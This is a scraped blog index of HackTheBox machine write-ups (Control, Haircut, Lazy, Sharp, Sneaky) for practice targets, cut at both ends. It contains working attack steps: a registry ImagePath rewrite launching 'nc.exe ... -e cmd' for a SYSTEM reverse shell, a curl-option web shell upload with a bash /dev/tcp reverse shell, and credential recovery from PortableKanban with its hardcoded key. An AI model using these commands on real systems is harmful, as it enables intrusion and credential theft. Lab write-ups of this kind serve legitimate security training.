I\u0026rsquo;ll run PrivescCheck We could\u0026rsquo;ve saw it from Powershell History First will list the services Second will list the permissions PS C:\\programdata\u0026gt; cat (Get-PSReadlineOption).HistorySavePath cat (Get-PSReadlineOption).HistorySavePath get-childitem HKLM:\\SYSTEM\\CurrentControlset | format-list get-acl HKLM:\\SYSTEM\\CurrentControlSet | format-list We have 237 SERVICES \u0026gt; Registry Permissions https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-modify-permissions We need to look for a service registry with LocalSystem PS HKLM:\\SYSTEM\\CurrentControlset\\Services\u0026gt; $services = get-itemproperty -path HKLM:\\SYSTEM\\CurrentControlset\\Services\\* $services = get-itemproperty -path HKLM:\\SYSTEM\\CurrentControlset\\Services\\* PS HKLM:\\SYSTEM\\CurrentControlset\\Services\u0026gt; $system_services = $services | where { $_.objectname -eq \u0026#39;LocalSystem\u0026#39; -and $_.start -eq 3} $system_services = $services | where { $_.objectname -eq \u0026#39;LocalSystem\u0026#39; -and $_.start -eq 3} PS HKLM:\\SYSTEM\\CurrentControlset\\Services\u0026gt; $system_services | select pschildname | measure-object $system_services | select pschildname | measure-object Count : 129 Average : Sum : Maximum : Minimum : Property : We need to check permissions for the services which we can start and stop https://dimitri.janczak.net/2018/06/01/start-stop-service-rights-to-non-administrators/ PS HKLM:\\SYSTEM\\CurrentControlset\\Services\u0026gt; $service_names = $system_services.pschildname $service_names = $system_services.pschildname PS HKLM:\\SYSTEM\\CurrentControlset\\Services\u0026gt; foreach ($service in $service_names) { $sddl = (cmd.exe /c sc.exe sdshow $service); if ($sddl -match \u0026#34;RP[A-Z]*?;;;AU\u0026#34;) { write-host $service; } } foreach ($service in $service_names) { $sddl = (cmd.exe /c sc.exe sdshow $service); if ($sddl -match \u0026#34;RP[A-Z]*?;;;AU\u0026#34;) { write-host $service; } } ConsentUxUserSvc DevicesFlowUserSvc DoSvc PimIndexMaintenanceSvc PrintWorkflowUserSvc seclogon SstpSvc UnistoreSvc UserDataSvc WaaSMedicSvc WinHttpAutoProxySvc wuauserv We can start the a few services Let\u0026rsquo;s start from the bottom We will use set-itemproperty PS C:\\programdata\u0026gt; set-itemproperty -path HKLM:\\system\\currentcontrolset\\services\\wuauserv -name imagepath -value \u0026#34;c:\\programdata\\nc.exe 10.10.16.9 8888 -e cmd\u0026#34; set-itemproperty -path HKLM:\\system\\currentcontrolset\\services\\wuauserv -name imagepath -value \u0026#34;c:\\programdata\\nc.exe 10.10.16.9 8888 -e cmd\u0026#34; PS C:\\programdata\u0026gt; get-itemproperty -path HKLM:\\system\\currentcontrolset\\services\\wuauserv get-itemproperty -path HKLM:\\system\\currentcontrolset\\services\\wuauserv DependOnService : {rpcss} Description : @%systemroot%\\system32\\wuaueng.dll,-106 DisplayName : @%systemroot%\\system32\\wuaueng.dll,-105 ErrorControl : 1 FailureActions : {128, 81, 1, 0...} ImagePath : c:\\programdata\\nc.exe 10.10.16.9 8888 -e cmd ObjectName : LocalSystem RequiredPrivileges : {SeAuditPrivilege, SeCreateGlobalPrivilege, SeCreatePageFilePrivilege, SeTcbPrivilege...} ServiceSidType : 1 Start : 3 SvcMemHardLimitInMB : 246 SvcMemMidLimitInMB : 167 SvcMemSoftLimitInMB : 88 Type : 32 PSPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\services\\wuauserv PSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\services PSChildName : wuauserv PSDrive : HKLM PSProvider : Microsoft.PowerShell.Core\\Registry Now, start the service and get your shell PS HKLM:\\SYSTEM\\CurrentControlset\\Services\u0026gt; start-service wuauserv start-service wuauserv start-service : Service \u0026#39;Windows Update (wuauserv)\u0026#39; cannot be started due to the following error: Cannot start service wuauserv on computer \u0026#39;.\u0026#39;. At line:1 char:1 + start-service wuauserv + ~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service], ServiceCommandException + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand ","date":"September 30, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/control/images/control.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/control/","summary":"Control Enumeration nmap └─$ nmap -Pn -p- 10.10.10.167 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 20:22 BST Nmap scan report for 10.10.10.167 (10.10.10.167) Host is up (0.11s latency). Not shown: 65530 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 3306/tcp open mysql 49666/tcp open unknown 49667/tcp open unknown └─$ nmap -Pn -p80,135,3306 -sC -sV 10.10.10.167 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 20:23 BST Nmap scan report for 10.","tags":["HTB","mysql","http-header","wfuzz","sqli","injection","mysql-file-write","hashcat","powershell-run-as","winpeas","privesccheck","registry","service","windows-service","powershell","sddl"],"title":"[HTB] Machine: Control"},{"categories":null,"contents":"Haircut Enumeration nmap └─$ nmap -Pn -p- 10.10.10.24 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:40 BST Nmap scan report for 10.10.10.24 (10.10.10.24) Host is up (0.11s latency). Not shown: 65507 filtered tcp ports (no-response), 26 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.24 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:41 BST Nmap scan report for 10.10.10.24 (10.10.10.24) Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA) | 256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA) |_ 256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519) 80/tcp open http nginx 1.10.0 (Ubuntu) |_http-title: HTB Hairdresser |_http-server-header: nginx/1.10.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.13 seconds Web server feroxbuster └─$ feroxbuster -u http://10.10.10.24 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.24 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [php, txt] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 286l 1220w 226984c http://10.10.10.24/bounce.jpg 200 GET 7l 15w 144c http://10.10.10.24/ 301 GET 7l 13w 194c http://10.10.10.24/uploads =\u0026gt; http://10.10.10.24/uploads/ 200 GET 19l 41w 446c http://10.10.10.24/exposed.php Foothold/User http://10.10.10.24/exposed.php Looks like a curl We can curl our web server If we try injecting command like http://localhost/test.html; ping -c 1 10.10.16.9, we receive an error Probably some filter Assuming it\u0026rsquo;s a curl, we can try passing curl options And it works Let\u0026rsquo;s upload a web shell http://10.10.16.9/shell.php -o uploads/shell.php Let\u0026rsquo;s get reverse shell Send url-encoded: bash -c \u0026quot;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.9/6666 0\u0026gt;\u0026amp;1\u0026quot; We could also pass $([command]) or `[command]` Root linpeas shows screen 4.5 ╔══════════╣ SUID - Check easy privesc, exploits and write perms ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid -rwsr-xr-x 1 root root 139K Jan 28 2017 /bin/ntfs-3g ---\u0026gt; Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017) -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 31K Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 40K May 4 2017 /bin/su -rwsr-xr-x 1 root root 40K Dec 16 2016 /bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping -rwsr-xr-x 1 root root 27K Dec 16 2016 /bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 134K Jan 20 2017 /usr/bin/sudo ---\u0026gt; check_if_the_sudo_version_is_vulnerable -rwsr-xr-x 1 root root 23K Jan 18 2016 /usr/bin/pkexec ---\u0026gt; Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485) -rwsr-xr-x 1 root root 33K May 4 2017 /usr/bin/newuidmap -rwsr-xr-x 1 root root 39K May 4 2017 /usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-xr-x 1 root root 33K May 4 2017 /usr/bin/newgidmap -rwsr-xr-x 1 root root 74K May 4 2017 /usr/bin/gpasswd -rwsr-sr-x 1 daemon daemon 51K Jan 14 2016 /usr/bin/at ---\u0026gt; RTru64_UNIX_4.0g(CVE-2002-1614) -rwsr-xr-x 1 root root 53K May 4 2017 /usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 1.6M May 19 2017 /usr/bin/screen-4.5.0 (Unknown SUID binary!) -rwsr-xr-x 1 root root 40K May 4 2017 /usr/bin/chsh -rwsr-xr-x 1 root root 49K May 4 2017 /usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 39K Mar 7 2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic -rwsr-xr-- 1 root messagebus 42K Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 204K Apr 29 2017 /usr/lib/snapd/snap-confine ---\u0026gt; Ubuntu_snapd\u0026lt;2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304) -rwsr-xr-x 1 root root 10K Mar 27 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 419K Mar 16 2017 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 15K Jan 18 2016 /usr/lib/policykit-1/polkit-agent-helper-1 exploit-db Perform the steps to get a root ","date":"September 30, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/haircut/images/haircut.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/haircut/","summary":"Haircut Enumeration nmap └─$ nmap -Pn -p- 10.10.10.24 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:40 BST Nmap scan report for 10.10.10.24 (10.10.10.24) Host is up (0.11s latency). Not shown: 65507 filtered tcp ports (no-response), 26 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.","tags":["HTB","php","upload","command-injection","parameter-injection","webshell","curl","filter","screen"],"title":"[HTB] Machine: Haircut"},{"categories":null,"contents":"Lazy Enumeration nmap └─$ nmap -Pn -p- 10.10.10.18 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:57 BST Nmap scan report for 10.10.10.18 (10.10.10.18) Host is up (0.10s latency). Not shown: 64514 filtered tcp ports (no-response), 1019 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 47.01 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.18 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:54 BST Nmap scan report for 10.10.10.18 (10.10.10.18) Host is up (0.53s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 e1:92:1b:48:f8:9b:63:96:d4:e5:7a:40:5f:a4:c8:33 (DSA) | 2048 af:a0:0f:26:cd:1a:b5:1f:a7:ec:40:94:ef:3c:81:5f (RSA) | 256 11:a3:2f:25:73:67:af:70:18:56:fe:a2:e3:54:81:e8 (ECDSA) |_ 256 96:81:9c:f4:b7:bc:1a:73:05:ea:ba:41:35:a4:66:b7 (ED25519) 80/tcp open http Apache/2.4.7 (Ubuntu) |_http-title: CompanyDev |_http-server-header: Apache/2.4.7 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.72 seconds feroxbuster └─$ feroxbuster -u http://10.10.10.18 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.18 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 403 GET 10l 30w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 301 GET 9l 28w 310c http://10.10.10.18/images =\u0026gt; http://10.10.10.18/images/ 301 GET 9l 28w 307c http://10.10.10.18/css =\u0026gt; http://10.10.10.18/css/ 200 GET 37l 233w 22523c http://10.10.10.18/images/banner.png 301 GET 9l 28w 311c http://10.10.10.18/classes =\u0026gt; http://10.10.10.18/classes/ 200 GET 0l 0w 0c http://10.10.10.18/classes/phpfix.php 200 GET 0l 0w 0c http://10.10.10.18/classes/user.php 200 GET 0l 0w 0c http://10.10.10.18/classes/db.php 302 GET 0l 0w 0c http://10.10.10.18/classes/auth.php =\u0026gt; http://10.10.10.18/admin/login.php 200 GET 4l 7w 57c http://10.10.10.18/css/companydev.css 200 GET 60l 95w 1592c http://10.10.10.18/register.php 200 GET 58l 97w 1548c http://10.10.10.18/login.php 200 GET 5l 16w 1027c http://10.10.10.18/images/key.png 200 GET 92l 538w 68572c http://10.10.10.18/images/maxresdefault.jpg 200 GET 4656l 9502w 81933c http://10.10.10.18/css/bootstrap.css 200 GET 41l 77w 1117c http://10.10.10.18/ ","date":"September 30, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/lazy/images/lazy.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/lazy/","summary":"Lazy Enumeration nmap └─$ nmap -Pn -p- 10.10.10.18 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:57 BST Nmap scan report for 10.10.10.18 (10.10.10.18) Host is up (0.10s latency). Not shown: 64514 filtered tcp ports (no-response), 1019 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 47.01 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.","tags":["HTB"],"title":"[HTB] Machine: Lazy"},{"categories":null,"contents":"Sharp Enumeration nmap └─$ nmap -Pn -p- 10.10.10.219 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:15 BST Nmap scan report for 10.10.10.219 (10.10.10.219) Host is up (0.11s latency). Not shown: 65529 filtered tcp ports (no-response) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5985/tcp open wsman 8888/tcp open sun-answerbook 8889/tcp open ddi-tcp-2 Nmap done: 1 IP address (1 host up) scanned in 29.11 seconds └─$ nmap -Pn -p135,139,445,5985,8888,8889 -sC -sV 10.10.10.219 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:16 BST Nmap scan report for 10.10.10.219 (10.10.10.219) Host is up (0.15s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8888/tcp open storagecraft-image StorageCraft Image Manager 8889/tcp open mc-nmf .NET Message Framing Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-09-30T20:17:13 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: -3s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 107.93 seconds smb └─$ smbmap -H 10.10.10.219 [+] IP: 10.10.10.219:445 Name: 10.10.10.219 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share dev NO ACCESS IPC$ NO ACCESS Remote IPC kanban READ ONLY └─$ smbclient -N //10.10.10.219/kanban Anonymous login successful Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sat Nov 14 18:56:03 2020 .. D 0 Sat Nov 14 18:56:03 2020 CommandLine.dll A 58368 Wed Feb 27 08:06:14 2013 CsvHelper.dll A 141312 Wed Nov 8 13:52:18 2017 DotNetZip.dll A 456704 Wed Jun 22 21:31:52 2016 Files D 0 Sat Nov 14 18:57:59 2020 Itenso.Rtf.Converter.Html.dll A 23040 Thu Nov 23 16:29:32 2017 Itenso.Rtf.Interpreter.dll A 75776 Thu Nov 23 16:29:32 2017 Itenso.Rtf.Parser.dll A 32768 Thu Nov 23 16:29:32 2017 Itenso.Sys.dll A 19968 Thu Nov 23 16:29:32 2017 MsgReader.dll A 376832 Thu Nov 23 16:29:32 2017 Ookii.Dialogs.dll A 133296 Thu Jul 3 22:20:12 2014 pkb.zip A 2558011 Thu Nov 12 20:04:59 2020 Plugins D 0 Thu Nov 12 20:05:11 2020 PortableKanban.cfg A 5819 Sat Nov 14 18:56:01 2020 PortableKanban.Data.dll A 118184 Thu Jan 4 21:12:46 2018 PortableKanban.exe A 1878440 Thu Jan 4 21:12:44 2018 PortableKanban.Extensions.dll A 31144 Thu Jan 4 21:12:50 2018 PortableKanban.pk3 A 2080 Sat Nov 14 18:56:01 2020 PortableKanban.pk3.bak A 2080 Sat Nov 14 18:55:54 2020 PortableKanban.pk3.md5 A 34 Sat Nov 14 18:56:03 2020 ServiceStack.Common.dll A 413184 Wed Sep 6 12:18:22 2017 ServiceStack.Interfaces.dll A 137216 Wed Sep 6 12:17:30 2017 ServiceStack.Redis.dll A 292352 Wed Sep 6 12:02:24 2017 ServiceStack.Text.dll A 411648 Wed Sep 6 04:38:18 2017 User Guide.pdf A 1050092 Thu Jan 4 21:14:28 2018 3803903 blocks of size 4096. 1462068 blocks available smb: \\\u0026gt; Foothold Let\u0026rsquo;s download the files Googling shows PortableKanban password retrieval Running it reveals some creds └─$ python3 49409.py PortableKanban.pk3 Administrator:G2@$btRSHJYTarg lars:G123HHrth234gRG RE Looks like the intended path was to reverse engineer the PortableKanban I\u0026rsquo;ll open it dnspy Click Edit -\u0026gt; Search Assemblies Enter password We have DbEncPassword etc. Open RoamingSettings We have a DbEncPassword which stores the encrypted password public string DbEncPassword { get; set; } // Token: 0x1700009D RID: 157 // (get) Token: 0x060002E3 RID: 739 RVA: 0x00029549 File Offset: 0x00027749 // (set) Token: 0x060002E4 RID: 740 RVA: 0x00029556 File Offset: 0x00027756 [Category(\u0026#34;\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\tData\u0026#34;)] [DisplayName(\u0026#34;Primary server password\u0026#34;)] [Description(\u0026#34;Master password required to get access to primary server databases. This password is common for all the users.\u0026#34;)] [PasswordPropertyText(true)] [IgnoreDataMember] [Browsable(true)] public string DbPassword { get { return Crypto.Decrypt(this.DbEncPassword); } set { this.DbEncPassword = Crypto.Encrypt(value.Trim()); } } Crypto.Decrypt And we see our key and IV in the code, which were used in script public static string Decrypt(string cryptedString) { string result; try { if (string.IsNullOrEmpty(cryptedString)) { result = string.Empty; } else { DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider(); result = new StreamReader(new CryptoStream(new MemoryStream(Convert.FromBase64String(cryptedString)), descryptoServiceProvider.CreateDecryptor(Crypto._rgbKey, Crypto._rgbIV), CryptoStreamMode.Read)).ReadToEnd(); } } catch (Exception) { result = string.Empty; } return result; } // Token: 0x04000001 RID: 1 private static byte[] _rgbKey = Encoding.ASCII.GetBytes(\u0026#34;7ly6UznJ\u0026#34;); // Token: 0x04000002 RID: 2 private static byte[] _rgbIV = Encoding.ASCII.GetBytes(\u0026#34;XuVUm5fR\u0026#34;); } } Shell Let\u0026rsquo;s test the creds we found We can smb as lars, but we can\u0026rsquo;t winrm └─$ crackmapexec smb 10.10.10.219 -u administrator -p \u0026#39;G2@$btRSHJYTarg\u0026#39; SMB 10.10.10.219 445 SHARP [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False) SMB 10.10.10.219 445 SHARP [-] Sharp\\administrator:G2@$btRSHJYTarg STATUS_LOGON_FAILURE └─$ crackmapexec smb 10.10.10.219 -u administrator -p \u0026#39;G2@$btRSHJYTarg\u0026#39; SMB 10.10.10.219 445 SHARP [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False) SMB 10.10.10.219 445 SHARP [-] Sharp\\administrator:G2@$btRSHJYTarg STATUS_LOGON_FAILURE Let\u0026rsquo;s check smb permissions └─$ smbmap -H 10.10.10.219 -u lars -p \u0026#39;G123HHrth234gRG\u0026#39; [+] IP: 10.10.10.219:445 Name: 10.10.10.219 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share dev READ ONLY IPC$ READ ONLY Remote IPC kanban NO ACCESS Let\u0026rsquo;s check dev Check content of the notes.txt └─$ smbclient //10.10.10.219/dev -U \u0026#39;lars%G123HHrth234gRG\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sun Nov 15 11:30:13 2020 .. D 0 Sun Nov 15 11:30:13 2020 Client.exe A 5632 Sun Nov 15 10:25:01 2020 notes.txt A 70 Sun Nov 15 13:59:02 2020 RemotingLibrary.dll A 4096 Sun Nov 15 10:25:01 2020 Server.exe A 6144 Mon Nov 16 11:55:44 2020 3803903 blocks of size 4096. 1459579 blocks available Todo: Migrate from .Net remoting to WCF Add input validation User Root ","date":"September 30, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/sharp/images/sharp.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/sharp/","summary":"Sharp Enumeration nmap └─$ nmap -Pn -p- 10.10.10.219 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:15 BST Nmap scan report for 10.10.10.219 (10.10.10.219) Host is up (0.11s latency). Not shown: 65529 filtered tcp ports (no-response) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5985/tcp open wsman 8888/tcp open sun-answerbook 8889/tcp open ddi-tcp-2 Nmap done: 1 IP address (1 host up) scanned in 29.11 seconds └─$ nmap -Pn -p135,139,445,5985,8888,8889 -sC -sV 10.","tags":["HTB"],"title":"[HTB] Machine: Sharp"},{"categories":null,"contents":"Sneaky Enumeration nmap └─$ nmap -Pn -p- 10.10.10.20 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:49 BST Warning: 10.10.10.20 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.20 (10.10.10.20) Host is up (0.10s latency). Not shown: 54464 filtered tcp ports (no-response), 6 filtered tcp ports (host-unreach), 11064 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 70.54 seconds └─$ nmap -Pn -p80 -sC -sV 10.10.10.20 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:50 BST Nmap scan report for 10.10.10.20 (10.10.10.20) Host is up (0.099s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-title: Under Development! |_http-server-header: Apache/2.4.7 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.51 seconds └─$ sudo nmap -Pn -sU --top-ports 10 10.10.10.20 --min-rate 10000 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 21:52 BST Nmap scan report for 10.10.10.20 (10.10.10.20) Host is up (0.16s latency). PORT STATE SERVICE 53/udp closed domain 67/udp open|filtered dhcps 123/udp open|filtered ntp 135/udp closed msrpc 137/udp closed netbios-ns 138/udp open|filtered netbios-dgm 161/udp open snmp 445/udp closed microsoft-ds 631/udp open|filtered ipp 1434/udp open|filtered ms-sql-m Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds Web server feroxbuster └─$ feroxbuster -u http://10.10.10.20 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.20 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 403 GET 10l 30w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 301 GET 9l 28w 307c http://10.10.10.20/dev =\u0026gt; http://10.10.10.20/dev/ 200 GET 142l 758w 47908c http://10.10.10.20/underdev.gif 200 GET 11l 20w 183c http://10.10.10.20/ [####################] - 83s 53171/53171 0s found:3 errors:0 [####################] - 81s 26584/26584 330/s http://10.10.10.20/ [####################] - 79s 26584/26584 335/s http://10.10.10.20/dev/ snmpwalk └─$ onesixtyone 10.10.10.20 -c /usr/share/doc/onesixtyone/dict.txt Scanning 1 hosts, 50 communities 10.10.10.20 [public] Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686 └─$ snmpwalk -v 2c -c public 10.10.10.20 SNMPv2-MIB::sysDescr.0 = STRING: Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686 ... IP-MIB::ipAddressSpinLock.0 = INTEGER: 1936614193 IP-MIB::ipAddressIfIndex.ipv4.\u0026#34;10.10.10.20\u0026#34; = INTEGER: 2 IP-MIB::ipAddressIfIndex.ipv4.\u0026#34;10.10.10.255\u0026#34; = INTEGER: 2 IP-MIB::ipAddressIfIndex.ipv4.\u0026#34;127.0.0.1\u0026#34; = INTEGER: 1 IP-MIB::ipAddressIfIndex.ipv6.\u0026#34;00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01\u0026#34; = INTEGER: 1 IP-MIB::ipAddressIfIndex.ipv6.\u0026#34;de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:64:2b\u0026#34; = INTEGER: 2 IP-MIB::ipAddressIfIndex.ipv6.\u0026#34;fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:64:2b\u0026#34; = INTEGER: 2 ... ipv6 ip -6 neigh - alternative way to find ipv6 address └─$ nmap -6 -Pn -p- dead:beef:0000:0000:0250:56ff:feb9:642b --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-15 19:43 BST Nmap scan report for dead:beef::250:56ff:feb9:642b Host 